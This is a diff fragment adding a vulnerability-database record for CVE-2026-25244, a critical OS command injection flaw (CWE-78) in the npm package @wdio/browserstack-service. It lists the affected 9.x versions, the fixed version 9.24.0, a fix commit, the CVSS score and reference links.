+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.367
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.369
+      - pkg:npm/%40wdio/browserstack-service@9.0.0-alpha.426
+      - pkg:npm/%40wdio/browserstack-service@9.0.0
+      - pkg:npm/%40wdio/browserstack-service@9.0.1
+      - pkg:npm/%40wdio/browserstack-service@9.0.2
+      - pkg:npm/%40wdio/browserstack-service@9.0.4
+      - pkg:npm/%40wdio/browserstack-service@9.0.5
+      - pkg:npm/%40wdio/browserstack-service@9.0.6
+      - pkg:npm/%40wdio/browserstack-service@9.0.7
+      - pkg:npm/%40wdio/browserstack-service@9.0.8
+      - pkg:npm/%40wdio/browserstack-service@9.0.9
+      - pkg:npm/%40wdio/browserstack-service@9.1.0
+      - pkg:npm/%40wdio/browserstack-service@9.1.1
+      - pkg:npm/%40wdio/browserstack-service@9.1.2
+      - pkg:npm/%40wdio/browserstack-service@9.1.3
+      - pkg:npm/%40wdio/browserstack-service@9.1.4
+      - pkg:npm/%40wdio/browserstack-service@9.1.5
+      - pkg:npm/%40wdio/browserstack-service@9.2.0
+      - pkg:npm/%40wdio/browserstack-service@9.2.1
+      - pkg:npm/%40wdio/browserstack-service@9.2.2
+      - pkg:npm/%40wdio/browserstack-service@9.2.4
+      - pkg:npm/%40wdio/browserstack-service@9.2.5
+      - pkg:npm/%40wdio/browserstack-service@9.2.6
+      - pkg:npm/%40wdio/browserstack-service@9.2.8
+      - pkg:npm/%40wdio/browserstack-service@9.2.11
+      - pkg:npm/%40wdio/browserstack-service@9.2.12
+      - pkg:npm/%40wdio/browserstack-service@9.2.14
+      - pkg:npm/%40wdio/browserstack-service@9.3.0
+      - pkg:npm/%40wdio/browserstack-service@9.3.1
+      - pkg:npm/%40wdio/browserstack-service@9.4.0
+      - pkg:npm/%40wdio/browserstack-service@9.4.1
+      - pkg:npm/%40wdio/browserstack-service@9.4.2
+      - pkg:npm/%40wdio/browserstack-service@9.4.3
+      - pkg:npm/%40wdio/browserstack-service@9.4.4
+      - pkg:npm/%40wdio/browserstack-service@9.4.5
+      - pkg:npm/%40wdio/browserstack-service@9.5.0
+      - pkg:npm/%40wdio/browserstack-service@9.5.1
+      - pkg:npm/%40wdio/browserstack-service@9.5.2
+      - pkg:npm/%40wdio/browserstack-service@9.5.3
+      - pkg:npm/%40wdio/browserstack-service@9.5.4
+      - pkg:npm/%40wdio/browserstack-service@9.5.6
+      - pkg:npm/%40wdio/browserstack-service@9.5.7
+      - pkg:npm/%40wdio/browserstack-service@9.6.0
+      - pkg:npm/%40wdio/browserstack-service@9.6.1
+      - pkg:npm/%40wdio/browserstack-service@9.6.2
+      - pkg:npm/%40wdio/browserstack-service@9.6.3
+      - pkg:npm/%40wdio/browserstack-service@9.6.4
+      - pkg:npm/%40wdio/browserstack-service@9.7.0
+      - pkg:npm/%40wdio/browserstack-service@9.7.1
+      - pkg:npm/%40wdio/browserstack-service@9.7.2
+      - pkg:npm/%40wdio/browserstack-service@9.7.3
+      - pkg:npm/%40wdio/browserstack-service@9.8.0
+      - pkg:npm/%40wdio/browserstack-service@9.9.0
+      - pkg:npm/%40wdio/browserstack-service@9.9.1
+      - pkg:npm/%40wdio/browserstack-service@9.9.2
+      - pkg:npm/%40wdio/browserstack-service@9.9.3
+      - pkg:npm/%40wdio/browserstack-service@9.10.0
+      - pkg:npm/%40wdio/browserstack-service@9.10.1
+      - pkg:npm/%40wdio/browserstack-service@9.11.0
+      - pkg:npm/%40wdio/browserstack-service@9.12.0
+      - pkg:npm/%40wdio/browserstack-service@9.12.1
+      - pkg:npm/%40wdio/browserstack-service@9.12.2
+      - pkg:npm/%40wdio/browserstack-service@9.12.3
+      - pkg:npm/%40wdio/browserstack-service@9.12.4
+      - pkg:npm/%40wdio/browserstack-service@9.12.5
+      - pkg:npm/%40wdio/browserstack-service@9.12.6
+      - pkg:npm/%40wdio/browserstack-service@9.12.7
+      - pkg:npm/%40wdio/browserstack-service@9.13.0
+      - pkg:npm/%40wdio/browserstack-service@9.14.0
+      - pkg:npm/%40wdio/browserstack-service@9.15.0
+      - pkg:npm/%40wdio/browserstack-service@9.16.0
+      - pkg:npm/%40wdio/browserstack-service@9.16.1
+      - pkg:npm/%40wdio/browserstack-service@9.16.2
+      - pkg:npm/%40wdio/browserstack-service@9.17.0
+      - pkg:npm/%40wdio/browserstack-service@9.18.0
+      - pkg:npm/%40wdio/browserstack-service@9.18.1
+      - pkg:npm/%40wdio/browserstack-service@9.18.3
+      - pkg:npm/%40wdio/browserstack-service@9.18.4
+      - pkg:npm/%40wdio/browserstack-service@9.19.0
+      - pkg:npm/%40wdio/browserstack-service@9.19.1
+      - pkg:npm/%40wdio/browserstack-service@9.19.2
+      - pkg:npm/%40wdio/browserstack-service@9.20.0
+      - pkg:npm/%40wdio/browserstack-service@9.20.1
+      - pkg:npm/%40wdio/browserstack-service@9.21.0
+      - pkg:npm/%40wdio/browserstack-service@9.22.0
+      - pkg:npm/%40wdio/browserstack-service@9.23.0
+      - pkg:npm/%40wdio/browserstack-service@9.23.1
+      - pkg:npm/%40wdio/browserstack-service@9.23.2
+    fixed_packages:
+      - pkg:npm/%40wdio/browserstack-service@9.24.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/webdriverio/webdriverio
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/webdriverio/webdriverio
+        commit: ea0e3e00288abced4c739ff9e46c46977b7cdbd2
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-5c46-x3qw-q7j7/GHSA-5c46-x3qw-q7j7.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/webdriverio/webdriverio
+    reference_type:
+    reference_id:
+  - url: https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204
+    reference_type:
+    reference_id:
+  - url: https://github.com/webdriverio/webdriverio/releases/tag/v9.24.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25244
+    reference_type:
+    reference_id: CVE-2026-25244
+  - url: https://github.com/webdriverio/webdriverio/security/advisories/GHSA-5c46-x3qw-q7j7
+    reference_type:
+    reference_id: GHSA-5c46-x3qw-q7j7
+exploits: []
